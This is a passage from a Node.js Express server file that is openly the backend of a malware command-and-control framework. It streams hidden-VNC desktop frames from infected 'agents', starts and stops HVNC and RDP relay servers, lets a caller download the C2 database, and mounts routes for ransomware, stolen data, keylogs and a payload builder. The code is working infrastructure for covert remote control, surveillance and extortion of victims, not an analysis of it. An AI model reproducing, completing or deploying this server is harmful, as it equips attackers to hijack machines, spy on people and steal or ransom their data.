    req.on('close', () => {
        isClosed = true;
        clearInterval(interval);
        console.log(`[MJPEG-HVNC] Stream closed for ${agentId} (${frameCount} frames)`);
    });
});

app.get('/api/hvnc/debug/:agentId', (req, res) => {
    const { agentId } = req.params;
    const frame = hvncFrames.get(agentId);
    if (frame) {
        res.json({
            agentId,
            hasFrame: true,
            width: frame.width,
            height: frame.height,
            timestamp: frame.timestamp,
            frameDataLength: frame.frame?.length || 0
        });
    } else {
        res.json({ agentId, hasFrame: false });
    }
});

app.get('/api/hvnc/viewer/:agentId', (req, res) => {
    const { agentId } = req.params;
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>HVNC Viewer</title></head>
        <body style="margin:0;background:#000;">
            <img src="/api/hvnc/mjpeg/${agentId}" style="width:100%;height:100%;object-fit:contain;" />
        </body>
        </html>
    `);
});

// ------------------------------------------------------------
// STATUS ROUTES
// ------------------------------------------------------------
app.get('/api/rdp/status', (req, res) => {
    const isMjpegActive = mjpegState.frame !== null && (Date.now() - mjpegState.lastUpdate < 5000);
    res.json({
        rdpRunning: rdpProcess !== null,
        rdpPort: 9000,
        hvncRunning: hvncProcess !== null,
        hvncPort: 1080,
        mjpegRunning: isMjpegActive,
        mjpegStreams: mjpegState.frame !== null ? 1 : 0,
        mjpegPort: 3000
    });
});

app.get('/api/hvnc/status', (req, res) => {
    const isRunning = hvncProcess !== null && hvncProcess.pid !== undefined;
    res.json({
        running: isRunning,
        pid: isRunning ? hvncProcess.pid : null,
        port: 1080
    });
});

app.post('/api/hvnc/stop', (req, res) => {
    const result = stopHVNCServer();
    res.json({
        success: result,
        message: result ? 'HVNC server stopped' : 'No HVNC server running'
    });
});

app.post('/api/hvnc/start', (req, res) => {
    const process = startHVNCServer();
    res.json({
        success: process !== null,
        message: process ? 'HVNC server started' : 'Failed to start HVNC server',
        pid: process ? process.pid : null
    });
});




app.get('/api/dbt-download', verifyToken, (req, res) => {
  const dbPath = path.join(__dirname, '..', 'c2_framework.db');
  
  if (!fs.existsSync(dbPath)) {
    console.error('[DB Download] File not found:', dbPath);
    return res.status(404).json({ error: 'Database file not found' });
  }

  res.setHeader('Content-Disposition', 'attachment; filename="c2_framework.db"');
  res.setHeader('Content-Type', 'application/octet-stream');
  
  const stream = fs.createReadStream(dbPath);
  stream.on('error', (err) => {
    console.error('[DB Download] Stream error:', err);
    if (!res.headersSent) {
      res.status(500).json({ error: 'Failed to read database file' });
    }
  });
  stream.pipe(res);
});



// ------------------------------------------------------------
// ROUTES
// ------------------------------------------------------------

app.get('/api/admin/users', verifyToken, requireAdmin, async (req, res) => {});
app.use('/api/auth', authRoutes);
app.use('/api/agents', verifyToken, agentRoutes);
app.use('/api/tasks', verifyToken, taskRoutes);
app.use('/api/modules', verifyToken, moduleRoutes);
app.use('/api/ransomware', ransomwareRoutes);
app.use('/api/stolen', verifyToken, stolenRoutes);
app.use('/api/keylogs', verifyToken, keylogsRoutes);
app.use('/api/build', builderRoutes);

app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date(), database: 'SQLite' });
});

require('./socket')(io);

// ------------------------------------------------------------
// CREATE DEFAULT ADMIN USER
// ------------------------------------------------------------












startCleanupJob();
// ------------------------------------------------------------
// START THE SERVERS
// ------------------------------------------------------------
const PORT = process.env.PORT || 3000;
const WEBRTC_PORT = process.env.WEBRTC_PORT || 8082;

// ─── START MAIN HTTP SERVER ──────────────────────────────────────
server.listen(PORT, () => {
    console.log(`🚀 C2 Server running on port ${PORT}`);
    console.log(`📡 API: http://localhost:${PORT}`);
    console.log(`💾 Database: SQLite (c2_framework.db)`);
    console.log(`📁 Static files served from: ${path.join(__dirname, '..', '..', 'www')}`);
    console.log(`📦 Payloads served from: ${path.join(__dirname, 'payloads')}`);
    
    startRdpLocalServer();
    startHVNCServer();
    

    console.log('\n📋 All servers started:');
    console.log(`   🔹 C2 API: http://localhost:${PORT}`);
    console.log(`   🔹 RDP Viewer: http://localhost:9000`);
    console.log(`   🔹 WebRTC Signaling: ws://localhost:${WEBRTC_PORT}`);
    console.log(`   🔹 WebRTC API: http://localhost:${PORT}/api/webrtc/status`);
    console.log(`   🔹 HVNC (legacy): http://localhost:1080`);
    console.log(`   🔹 MJPEG Relay: http://localhost:${PORT}/api/mjpeg/stream`);
    console.log(`   🔹 MJPEG Status: http://localhost:${PORT}/api/mjpeg/status`);
    console.log(`   🔹 MJPEG Killswitch: POST /api/mjpeg/killall`);
    console.log(`   🔹 HVNC MJPEG: http://localhost:${PORT}/api/hvnc/mjpeg/:agentId`);
    console.log(`   🔹 HVNC Test Viewer: http://localhost:${PORT}/api/hvnc/viewer/:agentId`);
    console.log(`   🔹 TCP Signaling (for HVNC client): port 9001`);
});

// ─── START WEBRTC WEBSOCKET SERVER ──────────────────────────────
// ─── START WEBRTC WEBSOCKET SERVER ──────────────────────────────
webRTCServer.listen(WEBRTC_PORT, '127.0.0.1', () => {
    console.log(`[WebRTC] WebSocket signaling server running on ws://127.0.0.1:${WEBRTC_PORT}`);
});

webRTCServer.on('error', (err) => {
    console.error('[WebRTC] Server error:', err);
    if (err.code === 'EADDRINUSE') {
        console.error(`[WebRTC] Port ${WEBRTC_PORT} is already in use. Kill the old process or change WEBRTC_PORT.`);
        process.exit(1);  // fail loudly instead of silently moving ports
    }
});

// ─── GRACEFUL SHUTDOWN ───────────────────────────────────────────
process.on('SIGINT', () => {
    console.log('\n🛑 Received SIGINT. Shutting down...');
    
    // Clean up WebRTC sessions
    for (const [sessionId, session] of webrtcSessions) {
        try {
            for (const viewer of session.viewers) {
                if (viewer.readyState === WebSocket.OPEN) {
                    viewer.close();
                }
            }
        } catch (e) {}
    }
    webrtcSessions.clear();
    
    stopRdpServer();
    stopHVNCServer();
    webRTCServer.close();
    server.close(() => {
        console.log('✅ All servers shut down gracefully');
        process.exit(0);
    });
});

process.on('SIGTERM', () => {
    console.log('\n🛑 Received SIGTERM. Shutting down...');
    
    // Clean up WebRTC sessions
    for (const [sessionId, session] of webrtcSessions) {
        try {
            for (const viewer of session.viewers) {
                if (viewer.readyState === WebSocket.OPEN) {
                    viewer.close();
                }
            }
        } catch (e) {}
    }
    webrtcSessions.clear();
    
    stopRdpServer();
    stopHVNCServer();
    webRTCServer.close();
    server.close(() => {
        console.log('✅ All servers shut down gracefully');
        process.exit(0);
    });
});

module.exports = { app, server, io };